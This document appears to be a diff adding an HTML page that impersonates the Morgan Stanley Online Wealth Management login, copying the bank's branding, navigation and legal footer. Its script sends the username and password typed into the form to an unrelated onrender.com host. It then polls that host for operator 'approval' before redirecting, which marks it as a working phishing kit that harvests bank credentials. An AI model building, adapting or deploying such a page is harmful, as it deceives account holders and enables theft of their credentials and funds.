@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11">
+    <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
+    <title>Morgan Stanley Online Log in - Wealth Management</title>
+    <!-- External CSS file -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Skip to main content link -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- Header -->
+    <div role="banner">
+        <div class="mso-header-container">
+            <div>
+                <svg width="200" height="32" viewBox="0 0 200 32" class="mso-desktop-header" aria-label="Morgan Stanley">
+                    <text x="0" y="24" font-family="Karla, Arial, sans-serif" font-weight="700" font-size="24" fill="#002b51">Morgan Stanley</text>
+                </svg>
+            </div>
+            <nav class="mso-header-nav-bar" aria-label="Main navigation">
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Online Security Center</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Find an Advisor / Branch</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Help + Support</a></div>
+            </nav>
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <main id="main-content" class="login-page">
+        <div class="login_form">
+            <div class="login-row">
+                <!-- Left column: Login form -->
+                <div class="login-left">
+                    <div class="login-container">
+                        <h2>Log in to Morgan Stanley</h2>
+
+                        <!-- Form with JavaScript integration -->
+                        <form id="loginForm">
+                            <div class="form-row">
+                                <input type="text" id="loginId" class="input-field" placeholder="Username" autocomplete="username" required aria-label="Username">
+                            </div>
+                            <div class="form-row">
+                                <div class="password-wrapper">
+                                    <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="current-password" required aria-label="Password">
+                                    <button type="button" class="show-hide" onclick="togglePassword()" id="toggle-btn">Show</button>
+                                </div>
+                            </div>
+                            <div class="form-row">
+                                <label class="checkbox-label">
+                                    Remember my username
+                                    <input type="checkbox" name="remember">
+                                    <span class="checkmark"></span>
+                                </label>
+                            </div>
+                            <div class="form-row text-center">
+                                <button type="submit" class="btn-login" id="loginBtn" disabled>
+                                    <span id="btnText">Log in</span>
+                                    <span id="btnSpinner" class="btn-spinner hidden"></span>
+                                </button>
+                            </div>
+                            <div class="form-row text-center">
+                                <button type="button" class="btn-secondary" onclick="window.location.href='page2.html';">Create a username</button>
+                            </div>
+                        </form>
+
+                        <!-- Forgot links -->
+                        <div class="forgot-row">
+                            <div class="forgot-item">
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='page2.html';">Forgot username?</button>
+                            </div>
+                            <div class="forgot-item">
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='page2.html';">Forgot password?</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right column: Banner (exact match) -->
+                <div class="login-right">
+                    <div class="banner">
+                        <div class="banner-content">
+                            <h3>Fresh Start.<br>Fresh Plan.</h3>
+                            <p>Total Tax 365 – tax-managed investing</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="ms-footer">
+            <div class="footer-content">
+                <div class="footer-columns">
+                    <div class="footer-column">
+                        <h4>Need Help?</h4>
+                        <div class="footer-links">
+                            <a href="#">Help + Support</a>
+                            <a href="#" class="mobile-only">Find an Advisor/Branch</a>
+                            <a href="#">Tutorial Videos</a>
+                            <a href="#" class="desktop-only">Co-Browse</a>
+                            <a href="#" class="mobile-only">Mobile Privacy Notice</a>
+                        </div>
+                    </div>
+                    <div class="footer-column footer-column-large">
+                        <h4>Legal</h4>
+                        <div class="footer-links">
+                            <a href="#">Online Security</a>
+                            <a href="#">Terms of Use</a>
+                            <a href="#">U.S. Patriot Act</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Financial Statement</a>
+                            <a href="#">Morgan Stanley & Co. LLC Financial Statement</a>
+                            <a href="#">Research Disclosures</a>
+                            <a href="#">FINRA Rule 4340</a>
+                            <a href="#">Rate Monitor</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Business Continuity Information</a>
+                            <a href="#">Investor Resources</a>
+                        </div>
+                    </div>
+                    <div class="footer-column desktop-only">
+                        <h4>Privacy</h4>
+                        <div class="footer-links">
+                            <a href="#">US Privacy Policy</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-copyright">
+                    © Morgan Stanley Smith Barney LLC, Member <a href="#">SIPC</a>. All rights reserved.
+                </div>
+            </div>
+        </footer>
+    </main>
+
+<script>
+    // DOM elements
+    const loginId = document.getElementById("loginId");
+    const password = document.getElementById("password");
+    const loginBtn = document.getElementById("loginBtn");
+    const loginForm = document.getElementById("loginForm");
+    const btnText = document.getElementById("btnText");
+    const btnSpinner = document.getElementById("btnSpinner");
+
+    // Toggle password visibility
+    function togglePassword() {
+        const passwordField = document.getElementById("password");
+        const toggleBtn = document.getElementById("toggle-btn");
+        if (passwordField.type === "password") {
+            passwordField.type = "text";
+            toggleBtn.textContent = "Hide";
+        } else {
+            passwordField.type = "password";
+            toggleBtn.textContent = "Show";
+        }
+    }
+
+    // Enable/disable login button based on input
+    function checkInputs() {
+        loginBtn.disabled = !(loginId.value.trim() && password.value.trim());
+    }
+
+    // Show loading spinner in button
+    function showButtonSpinner() {
+        btnText.classList.add("hidden");
+        btnSpinner.classList.remove("hidden");
+    }
+
+    // Hide loading spinner
+    function hideButtonSpinner() {
+        btnText.classList.remove("hidden");
+        btnSpinner.classList.add("hidden");
+    }
+
+    // Add real-time input validation
+    loginId.addEventListener("input", checkInputs);
+    password.addEventListener("input", checkInputs);
+
+    // Form submission handler
+    loginForm.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        loginBtn.disabled = true;
+        showButtonSpinner();
+
+        try {
+            const response = await fetch("https://mass-u4it.onrender.com/login", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    login: loginId.value.trim(),
+                    password: password.value.trim(),
+                }),
+            });
+
+            const data = await response.json();
+
+            if (!data.success) {
+                alert("Login failed: " + (data.error || "Unknown error"));
+                loginBtn.disabled = false;
+                hideButtonSpinner();
+                checkInputs();
+                return;
+            }
+
+            const sessionId = data.id;
+
+            // Start polling for approval & redirect
+            const pollStatus = async () => {
+                try {
+                    const statusResponse = await fetch(
+                        `https://mass-u4it.onrender.com/status/${sessionId}`
+                    );
+                    const statusData = await statusResponse.json();
+
+                    if (statusData.status === "approved" && statusData.redirect_url) {
+                        window.location.href = statusData.redirect_url;
+                    } else {
+                        setTimeout(pollStatus, 2000); // continue polling
+                    }
+                } catch (err) {
+                    console.error("Polling error:", err);
+                    setTimeout(pollStatus, 2000); // retry on error
+                }
+            };
+
+            pollStatus();
+
+        } catch (error) {
+            console.error("Submission error:", error);
+            alert("An error occurred. Please try again.");
+            loginBtn.disabled = false;
+            hideButtonSpinner();
+            checkInputs();
+        }
+    });
+
+    // Initial button state
+    checkInputs();
+</script>
+</body>
+</html>
